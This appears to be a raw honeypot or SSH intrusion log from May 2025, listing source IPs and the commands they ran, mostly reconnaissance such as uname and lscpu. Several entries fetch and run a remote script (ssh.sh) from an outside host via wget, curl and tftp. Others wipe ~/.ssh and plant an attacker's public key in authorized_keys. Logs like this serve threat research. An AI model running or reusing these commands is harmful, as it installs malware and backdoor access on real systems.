+2025-05-05 22:42:28 from 196.251.88.103: uname -s -v -n -r -m
+2025-05-05 22:43:02 from 196.251.88.103: uname -s -v -n -r -m
+2025-05-05 22:43:08 from 196.251.88.103: uname -s -v -n -r -m
+2025-05-05 22:44:05 from 196.251.88.103: uname -s -v -n -r -m
+2025-05-05 22:46:12 from 196.251.88.103: uname -s -v -n -r -m
+2025-05-05 22:48:22 from 196.251.88.103: uname -s -v -n -r -m
+2025-05-05 22:48:57 from 196.251.88.103: uname -s -v -n -r -m
+2025-05-05 22:49:14 from 196.251.88.103: uname -s -v -n -r -m
+2025-05-05 22:50:35 from 196.251.88.103: uname -s -v -n -r -m
+2025-05-05 22:50:58 from 196.251.88.103: uname -s -v -n -r -m
+2025-05-05 22:51:25 from 196.251.88.103: uname -s -v -n -r -m
+2025-05-05 22:53:08 from 196.251.88.103: uname -s -v -n -r -m
+2025-05-05 22:53:16 from 196.251.88.103: uname -s -v -n -r -m
+2025-05-05 22:53:42 from 196.251.88.103: uname -s -v -n -r -m
+2025-05-05 22:55:34 from 196.251.88.103: uname -s -v -n -r -m
+2025-05-05 22:56:04 from 196.251.88.103: uname -s -v -n -r -m
+2025-05-05 22:57:42 from 196.251.88.103: uname -s -v -n -r -m
+2025-05-05 22:58:03 from 176.65.148.10: cd /tmp; rm -rf wget.sh curl.sh; wget http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh;curl -o http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh; tftp -r ssh.sh -g 213.209.143.44; chmod 777 ssh.sh; sh ssh.sh
+2025-05-05 22:58:07 from 196.251.88.103: uname -s -v -n -r -m
+2025-05-05 23:00:20 from 34.85.163.94: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 23:00:21 from 34.85.163.94: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 23:03:27 from 23.95.229.171: lscpu
+2025-05-05 23:03:29 from 23.95.229.171: lscpu
+2025-05-05 23:03:31 from 23.95.229.171: lscpu
+2025-05-05 23:08:18 from 85.208.253.142: cd ~; chattr -ia .ssh; lockr -ia .ssh
+2025-05-05 23:08:19 from 85.208.253.142: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+2025-05-05 23:09:38 from 176.65.148.10: cd /tmp; rm -rf wget.sh curl.sh; wget http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh;curl -o http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh; tftp -r ssh.sh -g 213.209.143.44; chmod 777 ssh.sh; sh ssh.sh
+2025-05-05 23:11:27 from 176.65.148.10: cd /tmp; rm -rf wget.sh curl.sh; wget http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh;curl -o http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh; tftp -r ssh.sh -g 213.209.143.44; chmod 777 ssh.sh; sh ssh.sh
